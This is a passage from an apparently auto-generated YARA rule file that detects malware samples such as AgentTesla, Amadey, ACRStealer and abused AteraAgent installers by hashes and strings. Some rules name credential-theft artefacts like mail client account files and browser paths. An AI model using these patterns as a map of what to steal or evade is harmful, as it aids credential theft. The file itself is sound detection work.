      hash9 = "f152904e5d22122a4ccaa29fb03fbaf06fe030b319ee4fa6d10c30ad895b18c8"
      hash10 = "f5f7dd18f52ad8bda4e5bf0360713680252d4aa1b1240fb6ed3ac819781ecf8c"
      hash11 = "11eb198fa3f71428b79130b6b3303270a880d24ab4f23f2718ae13676c9a1290"
      hash12 = "13f1021212aff03b8ca336e02640f4c4fe2a3c0ff5d9dc52f5d907d7c684a0bd"
      hash13 = "19b1b578a7131791d368f8ee9952aa5d24b29f4879785b2bef21293304f21623"
      hash14 = "3b12c5d2a5297e788d71ea97da3992165c037a1cf541b7c987cc8063d33d565c"
      hash15 = "4c655ef445aa340f57a51a1b117674c41b0917a47295407ce2dee69e7a5f5800"
      hash16 = "5afa4d3a2779263357770e93b32055d7bd2a449678f552e72cc47c9d1085b150"
      hash17 = "6f0dc9a7249096aa0d427be6251cdd21ad3b8b39491db6072120a19d251f6b54"
      hash18 = "751905f2aebc29c0d9d587caf3664fae50912d9be02e0cda6ec9ef639d5b1a1d"
      hash19 = "7810ad9adf690135bdcc8cd581bf99aa986f4ee723b7ed38a1da2b3056379b31"
      hash20 = "88a82a5314a34297b8dcbc4107ba97f2573fbfb73dbf484bba974078308245fb"
      hash21 = "8a040cab0f85a6a2ea193c21226fc3330d4fe9e2850f7705b0b32ba1df505439"
      hash22 = "90934a7223298d694ec80a01da6b1f869e399db5d6bdea8d87db2473c76142a3"
      hash23 = "a7bb458039e8d22df9121317005940bebae6e7624fcfd010d5a7881b5e78347e"
      hash24 = "b18e08ab278139bea66ec5f739a7549ad4d1a666e6aab87ecfb0d30827669907"
      hash25 = "b8156f5309960e62d65cbb50379a75e7d554d14a0e1ee74bdf20deb8b6ca2f58"
      hash26 = "bee44d25e7798f6d4364e452633610b0656d76bc5c1577eced9a40554f53a04a"
      hash27 = "ea3f8e935a9f94910953b207faadeba9488b49c1b0684b8c848cbebd1fd7590d"
      hash28 = "f2f7a78a50e30ea654a93e6bdc7e53ab6a6b50b5018dfd36a9599bb9725bcbbe"
      hash29 = "fea78e68059354dfa41c1613756952165aac02aec20e0c4f84f9081edd94a901"
      hash30 = "db5d6808eb08b5e442b6c6ff6e420bae8efd8dac75a64cf5bddaa3375847eaaa"
      hash31 = "00346a9faf4013a0a4752372b2fe851884fedda7eaf448afaa707efd9c27c698"
      hash32 = "084fea92d4645b57741718989a710ccc24f9a0bfab4e53e743ea1abe41b6f8a9"
      hash33 = "272820e2d4dcf058e332b9f144286620e3ffdb58da931a754e396cce59f22aec"
      hash34 = "6298c804354559338892118869b0506efc4aead928b57f55edf83f4b91bccc1e"
      hash35 = "bd46c8b3aedcf068acae8498825cbd3614fcc72dfdcbe5526444eeac1f8dd76b"
      hash36 = "fd9dbcc0a59475ba77d799f67faeefe4264cbdec6b1a45180bd6104568a5ac52"
      hash37 = "58656e8c8bfb9d6b87926d2e3e0dd68c28abfe712344c6adbdafd49c83967bc7"
   strings:
      $s1 = "/AutoIt3ExecuteScript" fullword wide /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s2 = "/AutoIt3ExecuteLine" fullword wide /* PEStudio Blacklist: strings */ /* score: '23.00'*/
      $s3 = "PROCESSGETSTATS" fullword wide /* score: '22.50'*/
      $s4 = "WINGETPROCESS" fullword wide /* score: '22.50'*/
      $s5 = "SCRIPTNAME" fullword wide /* base64 encoded string 'H$H=3@0' */ /* score: '22.50'*/
      $s6 = "SHELLEXECUTEWAIT" fullword wide /* PEStudio Blacklist: strings */ /* score: '21.50'*/
      $s7 = "SHELLEXECUTE" fullword wide /* PEStudio Blacklist: strings */ /* score: '21.50'*/
      $s8 = "*Unable to get a list of running processes." fullword wide /* score: '20.00'*/
      $s9 = "PROCESSSETPRIORITY" fullword wide /* score: '17.50'*/
      $s10 = "HTTPSETUSERAGENT" fullword wide /* score: '17.50'*/
      $s11 = "PROCESSWAITCLOSE" fullword wide /* score: '17.50'*/
      $s12 = "PROCESSEXISTS" fullword wide /* score: '17.50'*/
      $s13 = "PROCESSCLOSE" fullword wide /* score: '17.50'*/
      $s14 = "PROCESSWAIT" fullword wide /* score: '17.50'*/
      $s15 = "PROCESSLIST" fullword wide /* score: '17.50'*/
   condition:
      ( ( uint16(0) == 0x0000 or uint16(0) == 0x5a4d ) and filesize < 5000KB and ( 8 of them )
      ) or ( all of them )
}

rule _a65f66967ed69bd39685e5b02b99ec97_imphash__AgentTesla_signature__56ffbbdda63dbdf1891621098d41e68d_imphash__AgentTesla_signat_23 {
   meta:
      description = "_subset_batch - from files a65f66967ed69bd39685e5b02b99ec97(imphash).exe, AgentTesla(signature)_56ffbbdda63dbdf1891621098d41e68d(imphash).exe, AgentTesla(signature)_5ba0e07214b3423072c72a6e1cb6e11f(imphash).exe, AgentTesla(signature)_719bb222f4bbc8859273f71b5809958a(imphash).exe, AgentTesla(signature)_9e1c5e753d9730385056638ab1d72c60(imphash).exe, AgentTesla(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "758082eaec75e22c896aa70ece7305dc9e3964fcb435fe6e5e1cbb73d379d9bc"
      hash2 = "6a15d4e73d8b68c7cd91c14c0fa94cc3781ed4d6e8a3ec946c792720c843c5f8"
      hash3 = "44e67d7221acd9c182b1f3fb928d32ac7a29df0642f53936cad8bcbb8c2e7d84"
      hash4 = "dd75642e3700f51c34db53e4636187c6a2c5c0de225e597f6eb0dffec5efc4c0"
      hash5 = "5a4f74ec41051e29202e8c3ae1fa9e521aa81af905d4bed66a4af22f7efbadd7"
      hash6 = "469e31f638615cb65dd38b450b40024649490930c8c5c84b94e2283835c36a6a"
   strings:
      $s1 = "UnhandledUnaryHUserDefinedOpMustHaveConsistentTypesHUserDefinedOpMustHaveValidReturnTypeNLogicalOperatorMustHaveBooleanOperators" ascii /* score: '26.00'*/
      $s2 = "8GetUserDefinedBinaryOperator" fullword ascii /* score: '20.00'*/
      $s3 = "FGetUserDefinedBinaryOperatorOrThrowFGetUserDefinedAssignOperatorOrThrow" fullword ascii /* score: '20.00'*/
      $s4 = "\"UncheckedGetField\"UncheckedSetField8UncheckedSetFieldBypassCctor&get_IsFieldInitOnly" fullword ascii /* score: '20.00'*/
      $s5 = "&GetFieldBypassCctor&SetFieldBypassCctor@" fullword ascii /* score: '20.00'*/
      $s6 = "System.Collections.Generic.IEnumerable<System.Linq.Expressions.Interpreter.InterpretedFrameInfo>.GetEnumerator@" fullword ascii /* score: '18.00'*/
      $s7 = "ReferenceEqual\"ReferenceNotEqual:GetEqualityComparisonOperator*GetComparisonOperator" fullword ascii /* score: '17.00'*/
      $s8 = "6GetUserDefinedUnaryOperator6GetMethodBasedUnaryOperator" fullword ascii /* score: '17.00'*/
      $s9 = "System.Collections.Generic.IComparer<System.Linq.Expressions.Interpreter.DebugInfo>.Compare@" fullword ascii /* score: '17.00'*/
      $s10 = ",GetUserDefinedCoercion<GetMethodBasedCoercionOperator" fullword ascii /* score: '17.00'*/
      $s11 = "DGetUserDefinedUnaryOperatorOrThrow" fullword ascii /* score: '17.00'*/
      $s12 = "IsConvertible(HasReferenceEquality4HasBuiltInEqualityOperator2IsImplicitlyConvertibleTo8GetUserDefinedCoercionMethod" fullword ascii /* score: '17.00'*/
      $s13 = "8GetMethodBasedBinaryOperator" fullword ascii /* score: '17.00'*/
      $s14 = "&get_IsLiftedLogical2get_IsReferenceComparison.ReduceUserdefinedLifted*CallGetValueOrDefault" fullword ascii /* score: '16.00'*/
      $s15 = "Conversion is not supported for arithmetic types without operator overloading" fullword wide /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 22000KB and ( 8 of them )
      ) or ( all of them )
}

rule _a3__Logger_signature__9017f999e8f28c6d793f6881aa75a9be_imphash__a3__Logger_signature__9017f999e8f28c6d793f6881aa75a9be_imph_24 {
   meta:
      description = "_subset_batch - from files a3--Logger(signature)_9017f999e8f28c6d793f6881aa75a9be(imphash).exe, a3--Logger(signature)_9017f999e8f28c6d793f6881aa75a9be(imphash)_0aad90fe.exe, a3--Logger(signature)_9017f999e8f28c6d793f6881aa75a9be(imphash)_22149b0e.exe, a3--Logger(signature)_9017f999e8f28c6d793f6881aa75a9be(imphash)_2f07b213.exe, a3--Logger(signature)_9017f999e8f28c6d793f6881aa75a9be(imphash)_5a849e64.exe, a3--Logger(signature)_9017f999e8f28c6d793f6881aa75a9be(imphash)_6918e767.exe, a3--Logger(signature)_9017f999e8f28c6d793f6881aa75a9be(imphash)_6f859d55.exe, a3--Logger(signature)_9017f999e8f28c6d793f6881aa75a9be(imphash)_7348b25d.exe, a3--Logger(signature)_9017f999e8f28c6d793f6881aa75a9be(imphash)_9b556b23.exe, a3--Logger(signature)_9017f999e8f28c6d793f6881aa75a9be(imphash)_a6fa6968.exe, a3--Logger(signature)_9017f999e8f28c6d793f6881aa75a9be(imphash)_d0040c52.exe, a3--Logger(signature)_9017f999e8f28c6d793f6881aa75a9be(imphash)_d8da191e.exe, a3--Logger(signature)_9017f999e8f28c6d793f6881aa75a9be(imphash)_fbaf62c0.exe, a3--Logger(signature)_d4c5c555974f83a3566c3421e71b64c6(imphash).exe, a3--Logger(signature)_eb747ef392be02f8aca143ca04851371(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b56bb0c49de472c525b9babe74c5ec42dcd5bf59124c33ecbaa2c4352876f1c6"
      hash2 = "0aad90fec98a34546de99b4c83424ef23b6a967e7096dd7efe544e92bb143392"
      hash3 = "22149b0e647e4309161e1908d1620f111a209436b288fdea265214cdebbb98c0"
      hash4 = "2f07b213c1011e1ab6b08456df810672bc30a82301a7529948262e47690e5b6a"
      hash5 = "5a849e64b65c6f62915336ae7abce6c1af560bd2caa343645e372b14816ebb8e"
      hash6 = "6918e767eaea5ec85ad611b425fe68d5d89f45114f5711f6c3366d307974795d"
      hash7 = "6f859d55d1ed8e9035fed061bb57fc1860a3c8c9cc42d6d621ca52bc89c3dae3"
      hash8 = "7348b25daab058f73ea6d07fabdc661ade7da5025e3d4910abe09948310f77fc"
      hash9 = "9b556b231ca7fa53f75d94a7d0d6c2cf3033b5936f48dfce9d02a4a9c039dccb"
      hash10 = "a6fa69683ac35b922b354a306128ac9b94cd5db5f5b800b6787f29e839f60306"
      hash11 = "d0040c52ffcdce6919af7fa1f93127df5d182b503ad53ba86c25136e4613adc8"
      hash12 = "d8da191e3fd27496caff93b24df4731ff7bc23dac4bb49a6687b2f612ac4ad60"
      hash13 = "fbaf62c070e275eeb07d0c4cc569e2c0c48141bca4487cb75f971038bf5fb264"
      hash14 = "0da276780e014975d0b5e3826c851e17628679c4ec1c0a1bdf08b58ce2013b68"
      hash15 = "ad79ba383703dd6a2316c5be3cea85af1e3413e86c5d33ba04ebca9412fdc346"
   strings:
      $s1 = "C:\\\\Users\\\\Public\\\\" fullword wide /* score: '27.00'*/
      $s2 = "vbsqlite3.dll" fullword ascii /* score: '23.00'*/
      $s3 = "VBSQLite3.dll" fullword ascii /* score: '23.00'*/
      $s4 = "Project1.exe" fullword ascii /* score: '22.00'*/
      $s5 = "C:\\\\Program Files\\Google\\Chrome\\Application\\GoogleChrome.exe" fullword wide /* score: '20.00'*/
      $s6 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.VC90.CRT\" version=\"9.0.21022.8\" processorArchitecture=\"x86\" publicK" ascii /* score: '18.00'*/
      $s7 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.VC90.CRT\" version=\"9.0.21022.8\" processorArchitecture=\"x86\" publicK" ascii /* score: '18.00'*/
      $s8 = "MailClient.Protocols.Smtp.SmtpAccountConfiguration" fullword wide /* score: '18.00'*/
      $s9 = "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\BraveSoftware.exe" fullword wide /* score: '17.00'*/
      $s10 = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\MicrosoftEdge.exe" fullword wide /* score: '17.00'*/
      $s11 = "CreateDecryptor" fullword wide /* PEStudio Blacklist: strings */ /* score: '16.00'*/
      $s12 = "\\Project1.exe" fullword wide /* score: '16.00'*/
      $s13 = "\\eM Client\\accounts.dat" fullword wide /* score: '15.00'*/
      $s14 = "\\accounts.dat" fullword wide /* score: '15.00'*/
      $s15 = "MailClient.Accounts.CredentialsModelTypes" fullword wide /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__057cca90_AgentTesla_signature__57a57b52c398ba0bf2f72c7ddb5a9e1e_imphash__25 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_057cca90.tar, AgentTesla(signature)_57a57b52c398ba0bf2f72c7ddb5a9e1e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "057cca90c1c6379e12d4723722c8143dbfba3490920d77944ff6d864869bef05"
      hash2 = "8603da5c311b08b5868e22b6f495dca6f2925e5582403d59ba9fb617d34c1c1b"
   strings:
      $x1 = "MatchesParameterTypeExactlyLowLevelLifoSemaphoreMultiplyDoublingByScalarSaturateHighFTargetNonVersionableAttributesourceJTryForm" ascii /* score: '41.00'*/
      $x2 = "getEventHandlerTypeELEMENTTYPECMODREQDConvertToInt64RoundToEvenScalar.getCalendarLdlocaSFalseVLdelemRefWriteAllLinesAsyncDynamic" ascii /* score: '32.00'*/
      $x3 = "NegateSaturateScalarCompareScalarOrderedNotEqualGetForwardedTypesZgetCompactedlenVisualizerObjectSourceTypeName~byteIndexShiftLe" ascii /* score: '32.00'*/
      $x4 = "MonitoringSurvivedProcessMemorySizeDispatchComEventInterfaceAttributeBGetDecimalYieldGetOffsetAndLengthJExecutionContextIsNullGe" ascii /* score: '32.00'*/
      $s5 = "fLocalizedResourcesSetUnixFileModeDecodeLastFromUtf8FDebugExp2M1WaitForPendingFinalizersJAbandonedMutexExceptionUnsafeTristateDL" ascii /* score: '29.00'*/
      $s6 = "MonitoringSurvivedProcessMemorySizeDispatchComEventInterfaceAttributeBGetDecimalYieldGetOffsetAndLengthJExecutionContextIsNullGe" ascii /* score: '28.00'*/
      $s7 = "ZIsCanceledgetTransformNamesDllImportAttributebsetLatencyModeSIGCONTSecurityTransparentAttributehPositiveSignReadUInt32BigEndian" ascii /* score: '28.00'*/
      $s8 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                            ' */ /* score: '26.50'*/
      $s9 = "SatelliteSynchronizationContextTaskSchedulerTaskCompletionSource1@HasComponentSizeAsUi1ToHexString\\ThrowOnUnmappableCharFormatI" ascii /* score: '26.00'*/
      $s10 = "vAssemblyCompanyAttributeTypeToTypeInfoMarshalerLocalBuilderjaddEventCommandExecutedCultureDataContextTrackingMode" fullword ascii /* score: '25.00'*/
      $s11 = "vPositiveMonetaryNumberFormatThreadPoolValueTaskSourceIntPtrpGetEnumeratord11ResolveUnmanagedDllToPathDenyChildAttachzMonitoring" ascii /* score: '24.00'*/
      $s12 = "TAllFlagsgetCurrencyDecimalSeparatorExecute~EnsuresOnThrowContainsNonCodeAccessPermissionsArgRanksAndBounds" fullword ascii /* score: '23.00'*/
      $s13 = "VWaiterCountWriteEventErrorCodeISerializable&PathsLastIndexOfPin>CheckNameTextWritergetProcessId" fullword ascii /* score: '23.00'*/
      $s14 = "AEdA0vv9jwGoFNljr1rVEt61I7L4XsOz.dll" fullword ascii /* score: '23.00'*/
      $s15 = "hIOSTATUSBLOCKTryReadUInt32BigEndianQueueUserWorkItemPToUInt32getContextWriteInt16LittleEndian" fullword ascii /* score: '22.00'*/
   condition:
      ( ( uint16(0) == 0x5550 or uint16(0) == 0x5a4d ) and filesize < 11000KB and pe.imphash() == "57a57b52c398ba0bf2f72c7ddb5a9e1e" and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _Amadey_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__315a8559_Amadey_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imp_26 {
   meta:
      description = "_subset_batch - from files Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_315a8559.exe, Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_bde6b957.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "315a8559935ef97b4fe5128d8ab92ba2a168be2519308e37db3ddf3a797e4902"
      hash2 = "bde6b957c804340015e6ecb4e9e551e221c51923c8f11fea07fcde54aaafaee1"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '33.00'*/
      $x2 = "srvcli.dll" fullword wide /* reversed goodware string 'lld.ilcvrs' */ /* score: '33.00'*/
      $x3 = "devrtl.dll" fullword wide /* reversed goodware string 'lld.ltrved' */ /* score: '33.00'*/
      $x4 = "dfscli.dll" fullword wide /* reversed goodware string 'lld.ilcsfd' */ /* score: '33.00'*/
      $x5 = "browcli.dll" fullword wide /* reversed goodware string 'lld.ilcworb' */ /* score: '33.00'*/
      $x6 = "linkinfo.dll" fullword wide /* reversed goodware string 'lld.ofniknil' */ /* score: '33.00'*/
      $s7 = "atl.dll" fullword wide /* reversed goodware string 'lld.lta' */ /* score: '30.00'*/
      $s8 = "SSPICLI.DLL" fullword wide /* score: '23.00'*/
      $s9 = "UXTheme.dll" fullword wide /* score: '23.00'*/
      $s10 = "oleaccrc.dll" fullword wide /* score: '23.00'*/
      $s11 = "dnsapi.DLL" fullword wide /* score: '23.00'*/
      $s12 = "iphlpapi.DLL" fullword wide /* score: '23.00'*/
      $s13 = "WINNSI.DLL" fullword wide /* score: '23.00'*/
      $s14 = "sfxrar.exe" fullword ascii /* score: '22.00'*/
      $s15 = "Cannot create folder %sHChecksum error in the encrypted file %s. Corrupt file or wrong password." fullword wide /* score: '21.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 8000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _AteraAgent_signature__AteraAgent_signature__0345dafe_AteraAgent_signature__123ee7b9_27 {
   meta:
      description = "_subset_batch - from files AteraAgent(signature).msi, AteraAgent(signature)_0345dafe.msi, AteraAgent(signature)_123ee7b9.msi"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "698dbae0f0a37b59c0ba4197135a279511881fe3cffd675feedc5b357b572ec9"
      hash2 = "0345dafeea831a7e4f70756ee3d3bff609f65ac1986798a8c13cb420c4c89797"
      hash3 = "123ee7b9737081cd149be31fde2cb882b40f126a9c5d208898cc4bb072203759"
   strings:
      $s1 = "System.ValueTuple.dll" fullword ascii /* score: '26.00'*/
      $s2 = "Microsoft.Deployment.WindowsInstaller.dll" fullword ascii /* score: '23.00'*/
      $s3 = "PubNub.dll" fullword ascii /* score: '23.00'*/
      $s4 = "AteraAgent.exe.config" fullword ascii /* score: '22.00'*/
      $s5 = "Failed in ExecCommon64 method" fullword ascii /* score: '22.00'*/
      $s6 = "nExecServiceConfig" fullword wide /* score: '22.00'*/
      $s7 = "failed to process XmlConfig changes" fullword ascii /* score: '21.00'*/
      $s8 = "\\Microsoft.Deployment.WindowsInstaller.dll" fullword wide /* score: '21.00'*/
      $s9 = "BouncyCastle.Crypto.dll" fullword ascii /* score: '19.00'*/
      $s10 = "wixca.dll" fullword wide /* score: '19.00'*/
      $s11 = "QtExecCmdTimeout" fullword wide /* score: '19.00'*/
      $s12 = "QtExecCmdLine" fullword wide /* score: '19.00'*/
      $s13 = "QtExec64CmdLine" fullword wide /* score: '19.00'*/
      $s14 = "ExecXmlConfigRollback" fullword wide /* score: '19.00'*/
      $s15 = "aExecXmlConfig" fullword wide /* score: '19.00'*/
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 9000KB and ( 8 of them )
      ) or ( all of them )
}

rule _9bc109acfded2eaae2348204bcab5c1c58a913105394336490272545d44507ce_9bc109ac_9cbefe68f395e67356e2a5d8d1b285c0_imphash__a520fd2_28 {
   meta:
      description = "_subset_batch - from files 9bc109acfded2eaae2348204bcab5c1c58a913105394336490272545d44507ce_9bc109ac.elf, 9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9bc109acfded2eaae2348204bcab5c1c58a913105394336490272545d44507ce"
      hash2 = "aa02002f4cdb80fe881ccaad7626f3161e83490b276659ab01879e736f44540f"
      hash3 = "8f54612f441c4a18564e6badf5709544370715e4529518d04b402dcd7f11b0fb"
   strings:
      $s1 = "runtime.getempty.func1" fullword ascii /* score: '22.00'*/
      $s2 = "runtime.getempty" fullword ascii /* score: '22.00'*/
      $s3 = "runtime.execute" fullword ascii /* score: '21.00'*/
      $s4 = "runtime.tracebackHexdump" fullword ascii /* score: '20.00'*/
      $s5 = "runtime.hexdumpWords" fullword ascii /* score: '20.00'*/
      $s6 = "runtime.injectglist" fullword ascii /* score: '20.00'*/
      $s7 = "runtime.gcDumpObject" fullword ascii /* score: '20.00'*/
      $s8 = "runtime.tracebackHexdump.func1" fullword ascii /* score: '20.00'*/
      $s9 = "runtime.(*rwmutex).rlock" fullword ascii /* score: '18.00'*/
      $s10 = "runtime.(*rwmutex).rlock.func1" fullword ascii /* score: '18.00'*/
      $s11 = "runtime.(*rwmutex).runlock" fullword ascii /* score: '18.00'*/
      $s12 = "runtime.templateThread" fullword ascii /* score: '17.00'*/
      $s13 = "runtime.startTemplateThread" fullword ascii /* score: '17.00'*/
      $s14 = "runtime.putempty" fullword ascii /* score: '17.00'*/
      $s15 = "runtime.gogetenv" fullword ascii /* score: '15.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 18000KB and ( 8 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__057cca90_AgentTesla_signature__bb4d11c9_29 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_057cca90.tar, AgentTesla(signature)_bb4d11c9.tar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "057cca90c1c6379e12d4723722c8143dbfba3490920d77944ff6d864869bef05"
      hash2 = "bb4d11c9981fbf16b12cf1731ff24da3f0f5127bb363fb9cc55b50d8e977f3b2"
   strings:
      $x1 = "NetLog events and metadata, including sensitive information such as hostnames, URLs, HTTP headers and other identifiable informa" ascii /* score: '33.00'*/
      $s2 = "NetLog events and metadata, including sensitive information such as hostnames, URLs, HTTP headers and other identifiable informa" ascii /* score: '25.00'*/
      $s3 = "msedge.dll" fullword wide /* score: '23.00'*/
      $s4 = "Wwindows.storage.onecore.dll" fullword wide /* score: '23.00'*/
      $s5 = "rbcryptprimitives.dll" fullword wide /* score: '23.00'*/
      $s6 = ").  Dumping unresolved backtrace:" fullword ascii /* score: '21.00'*/
      $s7 = "Stale pooled_task_runner_delegate_ - task not posted. This is" fullword ascii /* score: '20.00'*/
      $s8 = "NetLog events and metadata. Describes the operation of the //net network stack, e.g. HTTP requests, TLS, DNS, connections, socke" ascii /* score: '20.00'*/
      $s9 = "NetLog events and metadata. Describes the operation of the //net network stack, e.g. HTTP requests, TLS, DNS, connections, socke" ascii /* score: '20.00'*/
      $s10 = "api-ms-win-core-wow64-l1-1-1.dll" fullword wide /* score: '20.00'*/
      $s11 = "identity_helper.exe" fullword wide /* score: '19.00'*/
      $s12 = "Includes events when processes enter and leave states defined in //components/performance_manager/scenario_api/performance_scena" ascii /* score: '18.00'*/
      $s13 = "SequenceManager.WillProcessTaskTimeObservers" fullword ascii /* score: '18.00'*/
      $s14 = "SequenceManager.DidProcessTaskObservers" fullword ascii /* score: '18.00'*/
      $s15 = "Includes events when processes enter and leave states defined in //components/performance_manager/scenario_api/performance_scena" ascii /* score: '18.00'*/
   condition:
      ( ( uint16(0) == 0x5550 or uint16(0) == 0x4f50 ) and filesize < 16000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__19d82722_AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5_30 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_19d82722.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_84a03d4c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "19d827229db9c2e05384b3422e238c54206f976c279967eb6a2097cc19ba4324"
      hash2 = "84a03d4c69389af18a55a569813bd9d02f6c2cee34eea0efb7fe267662bf706e"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD*G" fullword ascii /* score: '27.00'*/
      $s2 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD4T" fullword ascii /* score: '27.00'*/
      $s3 = "iamgeB.ErrorImage" fullword wide /* score: '10.00'*/
      $s4 = "iamgeA.ErrorImage" fullword wide /* score: '10.00'*/
      $s5 = "getHeigh" fullword ascii /* score: '9.00'*/
      $s6 = "getWeight" fullword ascii /* score: '9.00'*/
      $s7 = "labelComp5" fullword wide /* score: '8.00'*/
      $s8 = "labelComp1" fullword wide /* score: '8.00'*/
      $s9 = "labelComp2" fullword wide /* score: '8.00'*/
      $s10 = "labelComp4" fullword wide /* score: '8.00'*/
      $s11 = "labelComp3" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _9de24f4b875ab03a090f4ef94a1a134cd945d25380e089184c51ec945250cf13_9de24f4b_AteraAgent_signature__AteraAgent_signature__0345d_31 {
   meta:
      description = "_subset_batch - from files 9de24f4b875ab03a090f4ef94a1a134cd945d25380e089184c51ec945250cf13_9de24f4b.msi, AteraAgent(signature).msi, AteraAgent(signature)_0345dafe.msi, AteraAgent(signature)_123ee7b9.msi"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9de24f4b875ab03a090f4ef94a1a134cd945d25380e089184c51ec945250cf13"
      hash2 = "698dbae0f0a37b59c0ba4197135a279511881fe3cffd675feedc5b357b572ec9"
      hash3 = "0345dafeea831a7e4f70756ee3d3bff609f65ac1986798a8c13cb420c4c89797"
      hash4 = "123ee7b9737081cd149be31fde2cb882b40f126a9c5d208898cc4bb072203759"
   strings:
      $x1 = "rstrtmgr.dll" fullword wide /* reversed goodware string 'lld.rgmtrtsr' */ /* score: '33.00'*/
      $s2 = "failed to get WixShellExecBinaryId" fullword ascii /* score: '29.00'*/
      $s3 = "failed to get handle to kernel32.dll" fullword ascii /* score: '28.00'*/
      $s4 = "failed to process target from CustomActionData" fullword ascii /* score: '28.00'*/
      $s5 = "failed to get security descriptor's DACL - error code: %d" fullword ascii /* score: '26.00'*/
      $s6 = "The process, %ls, could not be registered with the Restart Manager (probably because the setup is not elevated and the process i" ascii /* score: '26.00'*/
      $s7 = "failed to get WixShellExecTarget" fullword ascii /* score: '26.00'*/
      $s8 = "App: %ls found running, %d processes, attempting to send message." fullword ascii /* score: '25.00'*/
      $s9 = "Command failed to execute." fullword ascii /* score: '25.00'*/
      $s10 = "failed to schedule ExecServiceConfig action" fullword ascii /* score: '25.00'*/
      $s11 = "Failed to load mscoree.dll (Error code %d). This custom action requires the .NET Framework to be installed." fullword wide /* score: '25.00'*/
      $s12 = "failed to openexecute temp view with query %ls" fullword ascii /* score: '24.00'*/
      $s13 = "The process, %ls, could not be registered with the Restart Manager (probably because the setup is not elevated and the process i" ascii /* score: '23.00'*/
      $s14 = "failed to get message to send to users when server reboots due to service failure." fullword ascii /* score: '23.00'*/
      $s15 = "WixShellExecTarget is %ls" fullword ascii /* score: '23.00'*/
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 15000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _ACRStealer_signature__297cfecdeec7600638a2d663ab104d8a_imphash__ACRStealer_signature__587336fb_32 {
   meta:
      description = "_subset_batch - from files ACRStealer(signature)_297cfecdeec7600638a2d663ab104d8a(imphash).dll, ACRStealer(signature)_587336fb.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1c53636c057477792d6accc5431aae32e85225584c5bfb5ff609a8457b8a71df"
      hash2 = "587336fb764ff669fdf36ec1043d6cedaf092d49fc8b2f3a7ac90ed37a636690"
   strings:
      $s1 = "OSSL_STORE_INFO_get1_NAME_description" fullword ascii /* score: '15.00'*/
      $s2 = "EVP_PKEY_get0_siphash" fullword ascii /* score: '15.00'*/
      $s3 = "PKCS12 import password" fullword ascii /* score: '15.00'*/
      $s4 = "PKCS8 decrypt password" fullword ascii /* score: '14.00'*/
      $s5 = "OSSL_STORE_LOADER_new" fullword ascii /* score: '13.00'*/
      $s6 = "EVP_PKEY_get0_DH" fullword ascii /* score: '12.00'*/
      $s7 = "EVP_PKEY_get0_hmac" fullword ascii /* score: '12.00'*/
      $s8 = "EVP_PKEY_get0_poly1305" fullword ascii /* score: '12.00'*/
      $s9 = "OSSL_STORE_INFO_get1_PKEY" fullword ascii /* score: '12.00'*/
      $s10 = "EVP_PKEY_get0_DSA" fullword ascii /* score: '12.00'*/
